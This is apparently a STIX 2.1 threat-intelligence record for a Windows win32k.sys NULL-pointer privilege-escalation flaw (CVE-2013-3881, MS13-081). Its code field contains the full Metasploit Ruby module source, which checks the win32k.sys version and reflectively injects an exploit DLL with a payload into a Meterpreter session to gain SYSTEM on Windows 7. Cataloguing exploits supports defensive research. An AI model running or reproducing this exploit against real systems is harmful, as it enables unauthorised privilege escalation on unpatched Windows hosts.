{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--5eb075de-9167-4424-8023-5fcd1b28eccd",
    "created": "2024-08-14T16:50:12.296093Z",
    "modified": "2024-08-14T16:50:12.296097Z",
    "name": "Windows TrackPopupMenuEx Win32k NULL Page",
    "description": " This module exploits a vulnerability in win32k.sys where under specific conditions TrackPopupMenuEx will pass a NULL pointer to the MNEndMenuState procedure. This module has been tested successfully on Windows 7 SP0 and Windows 7 SP1.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/ms13_081_track_popup_menu.rb",
            "external_id": "ms13_081_track_popup_menu.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3881"
        },
        {
            "source_name": "reference",
            "url": "http://endgame.com/news/microsoft-win32k-null-page-vulnerability-technical-analysis.html"
        },
        {
            "source_name": "reference",
            "url": "http://immunityproducts.blogspot.com/2013/11/exploiting-cve-2013-3881-win32k-null.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Post::File\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n  include Msf::Post::Windows::FileInfo\n  include Msf::Post::Windows::ReflectiveDLLInjection\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Windows TrackPopupMenuEx Win32k NULL Page',\n          'Description' => %q{\n            This module exploits a vulnerability in win32k.sys where under\n            specific conditions TrackPopupMenuEx will pass a NULL pointer to\n            the MNEndMenuState procedure. This module has been tested\n            successfully on Windows 7 SP0 and Windows 7 SP1.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => [\n            'Seth Gibson', # vulnerability discovery\n            'Dan Zentner', # vulnerability discovery\n            'Matias Soler', # vulnerability analysis\n            'Spencer McIntyre'\n          ],\n          'Arch' => ARCH_X86,\n          'Platform' => 'win',\n          'SessionTypes' => [ 'meterpreter' ],\n          'DefaultOptions' => {\n            'EXITFUNC' => 'thread'\n          },\n          'Targets' => [\n            [ 'Windows 7 SP0/SP1', {} ]\n          ],\n          'Payload' => {\n            'Space' => 4096,\n            'DisableNops' => true\n          },\n          'References' => [\n            [ 'CVE', '2013-3881' ],\n            [ 'OSVDB', '98212' ],\n            [ 'BID', '62830'],\n            [ 'MSB', 'MS13-081' ],\n            [ 'URL', 'http://endgame.com/news/microsoft-win32k-null-page-vulnerability-technical-analysis.html' ],\n            [ 'URL', 'http://immunityproducts.blogspot.com/2013/11/exploiting-cve-2013-3881-win32k-null.html' ]\n          ],\n          'DisclosureDate' => '2013-10-08',\n          'DefaultTarget' => 0,\n          'Notes' => {\n            'Stability' => [ CRASH_OS_RESTARTS, ]\n          }\n        }\n      )\n    )\n  end\n\n  def check\n    if session.platform != 'windows'\n      return Exploit::CheckCode::Safe\n    end\n\n    file_path = expand_path('%windir%') << '\\\\system32\\\\win32k.sys'\n    major, minor, build, revision, branch = file_version(file_path)\n    vprint_status(\"win32k.sys file version: #{major}.#{minor}.#{build}.#{revision} branch: #{branch}\")\n\n    case build\n    when 7600\n      return Exploit::CheckCode::Appears\n    when 7601\n      return Exploit::CheckCode::Appears if revision <= 18126\n    when 9200\n      return Exploit::CheckCode::Safe\n    end\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    if is_system?\n      fail_with(Failure::None, 'Session is already elevated')\n    end\n\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system.')\n    end\n\n    if sysinfo['Architecture'] == ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')\n    end\n\n    # invoke the exploit, passing in the address of the payload that\n    # we want invoked on successful exploitation.\n    print_status('Reflectively injecting the exploit DLL and triggering the exploit...')\n    encoded_payload = payload.encoded\n    execute_dll(\n      ::File.join(Msf::Config.data_directory, 'exploits', 'cve-2013-3881', 'cve-2013-3881.x86.dll'),\n      encoded_payload\n    )\n\n    print_good('Exploit finished, wait for (hopefully privileged) payload execution to complete.')\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-10-08",
    "x_mitre_platforms": [
        "win'"
    ]
}